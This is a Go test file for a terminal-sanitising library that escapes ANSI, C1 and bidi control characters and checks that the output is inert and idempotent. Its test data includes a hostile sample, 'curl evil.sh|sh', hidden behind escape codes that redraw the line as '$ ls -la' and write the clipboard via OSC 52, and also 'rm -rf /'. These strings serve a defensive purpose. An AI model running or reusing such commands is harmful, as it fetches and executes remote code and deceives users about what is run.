package termsafe

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

// hostile draws "$ ls -la" over the command and writes the clipboard.
const hostile = "curl evil.sh|sh \x1b[2K\x1b[1G$ ls -la \x1b]52;c;ZXZpbA==\x07"

// inert reports whether a terminal would only show s (with \n and \t
// allowed when lines is set).
func inert(s string, lines bool) bool {
	if !utf8.ValidString(s) {
		return false
	}
	for _, r := range s {
		if lines && (r == '\n' || r == '\t') {
			continue
		}
		if Unsafe(r) {
			return false
		}
	}
	return true
}

func TestEscape(t *testing.T) {
	for _, tc := range []struct{ name, in, want string }{
		{"plain", "git push origin main", "git push origin main"},
		{"unicode", "naïve ✓ 日本語 🙂 → é", "naïve ✓ 日本語 🙂 → é"},
		{"empty", "", ""},
		{"esc csi", "a\x1b[2Kb", "a␛[2Kb"},
		{"osc 52", "\x1b]52;c;QQ==\x07", "␛]52;c;QQ==␇"},
		{"overwrite", hostile, "curl evil.sh|sh ␛[2K␛[1G$ ls -la ␛]52;c;ZXZpbA==␇"},
		{"nul bs del", "a\x00b\x08c\x7fd", "a␀b␈c␡d"},
		{"newline tab cr", "a\nb\tc\rd", "a␊b␉c␍d"},
		{"c1 csi", "a\u009b2Kb", "a<U+009B>2Kb"},
		{"c1 range", "\u0080\u0085\u009f", "<U+0080><U+0085><U+009F>"},
		{"bidi override", "a\u202eb\u202c", "a<U+202E>b<U+202C>"},
		{"bidi isolates", "\u2066\u2067\u2068\u2069", "<U+2066><U+2067><U+2068><U+2069>"},
		{"separators", "a\u2028b\u2029c", "a<U+2028>b<U+2029>c"},
		{"invalid utf-8", "a\xffb\x9bc", "a\ufffdb\ufffdc"},
		{"neighbours kept", "\u007e\u00a0\u2029\u202f\u2065\u206a", "\u007e\u00a0<U+2029>\u202f\u2065\u206a"},
	} {
		got := Escape(tc.in)
		if got != tc.want {
			t.Errorf("%s: Escape(%q) = %q, want %q", tc.name, tc.in, got, tc.want)
		}
		if !inert(got, false) {
			t.Errorf("%s: %q still has something a terminal acts on", tc.name, got)
		}
		if again := Escape(got); again != got {
			t.Errorf("%s: not idempotent: %q then %q", tc.name, got, again)
		}
	}
}

func TestLine(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"  git   push\n\torigin\r\nmain  ", "git push origin main"},
		{"rm -rf /\r$ ls", "rm -rf / $ ls"},
		{hostile, "curl evil.sh|sh ␛[2K␛[1G$ ls -la ␛]52;c;ZXZpbA==␇"},
		{"a\vb\fc\u0085d", "a b c d"}, // other white space separates too
		{"", ""},
		{" \n ", ""},
	} {
		got := Line(tc.in)
		if got != tc.want {
			t.Errorf("Line(%q) = %q, want %q", tc.in, got, tc.want)
		}
		if !inert(got, false) {
			t.Errorf("Line(%q) = %q is not inert", tc.in, got)
		}
	}
}

func TestText(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"one\ntwo\n\tthree\n", "one\ntwo\n\tthree\n"},
		{"dos\r\nlines\r\n", "dos\nlines\n"},
		{"100%\rfake", "100%␍fake"},
		{"end\r", "end␍"},
		{"\x1b[8mhidden\x1b[0m\nnext", "␛[8mhidden␛[0m\nnext"},
		{"a\u009b1Ab\u202ec", "a<U+009B>1Ab<U+202E>c"},
		{"bad\xc3", "bad\ufffd"},
	} {
		got := Text(tc.in)
		if got != tc.want {
			t.Errorf("Text(%q) = %q, want %q", tc.in, got, tc.want)
		}
		if !inert(got, true) {
			t.Errorf("Text(%q) = %q is not inert", tc.in, got)
		}
		if again := Text(got); again != got {
			t.Errorf("Text not idempotent on %q", tc.in)
		}
	}
}

// Every rune a terminal acts on is covered, and nothing printable is
// touched.
func TestEveryControlIsEscaped(t *testing.T) {
	for r := rune(0); r < 0x3000; r++ {
		s := "x" + string(r) + "y"
		got := Escape(s)
		if !inert(got, false) {
			t.Fatalf("U+%04X got through: %q", r, got)
		}
		if !Unsafe(r) && got != s {
			t.Fatalf("U+%04X is printable but became %q", r, got)
		}
		if Unsafe(r) && got == s {
			t.Fatalf("U+%04X unchanged", r)
		}
	}
	for b := 0; b < 256; b++ {
		if got := Escape(string([]byte{'x', byte(b), 'y'})); !inert(got, false) {
			t.Fatalf("byte %#x got through: %q", b, got)
		}
	}
}

func TestJSON(t *testing.T) {
	v := map[string]string{
		"cmd\u009b":  hostile + "\x7f\u0085\u202e\u2066\u2028 é 日本 🙂",
		"plain":      "nothing to do",
		"quote\\\"":  "a\\u009b stays an escape of a backslash: \\",
		"\u202ekey":  "\u2069",
		"highascii~": "~\u00a0\u00ff",
	}
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	safe := JSON(raw)
	for _, r := range string(safe) {
		if Unsafe(r) {
			t.Fatalf("U+%04X left in %s", r, safe)
		}
	}
	var back map[string]string
	if err := json.Unmarshal(safe, &back); err != nil {
		t.Fatalf("%v: %s", err, safe)
	}
	if len(back) != len(v) {
		t.Fatalf("keys changed: %v", back)
	}
	for k, want := range v {
		if back[k] != want {
			t.Errorf("%q: %q, want %q", k, back[k], want)
		}
	}
	if !bytes.Contains(safe, []byte(`\u009b`)) || !bytes.Contains(safe, []byte(`\u007f`)) || !bytes.Contains(safe, []byte(`\u202e`)) {
		t.Fatalf("expected lower-case \\u escapes: %s", safe)
	}
	plain := []byte(`{"a":"b"}`)
	if got := JSON(plain); &got[0] != &plain[0] {
		t.Fatal("clean JSON should come back as is")
	}
}

// The writer gives the same result as Text however the input is cut.
func TestWriter(t *testing.T) {
	in := "+plain\r\n+caf\u00e9 \x1b[31mred\x1b[0m\n+\u009b2K 日本\r\n+cr\rmid\n+bidi \u202e\xff end\r"
	want := Text(in)
	for size := 1; size <= len(in); size++ {
		var out strings.Builder
		w := NewWriter(&out)
		for i := 0; i < len(in); i += size {
			end := min(i+size, len(in))
			n, err := w.Write([]byte(in[i:end]))
			if err != nil || n != end-i {
				t.Fatalf("size %d: wrote %d, %v", size, n, err)
			}
			if !inert(out.String(), true) {
				t.Fatalf("size %d: raw control after %d bytes: %q", size, end, out.String())
			}
		}
		if err := w.Flush(); err != nil {
			t.Fatal(err)
		}
		if out.String() != want {
			t.Fatalf("size %d:\n got %q\nwant %q", size, out.String(), want)
		}
	}
	// Flushing twice, or with nothing held, writes nothing more.
	var out strings.Builder
	w := NewWriter(&out)
	_, _ = w.Write([]byte("ok\n"))
	_ = w.Flush()
	_ = w.Flush()
	if out.String() != "ok\n" {
		t.Fatalf("%q", out.String())
	}
}
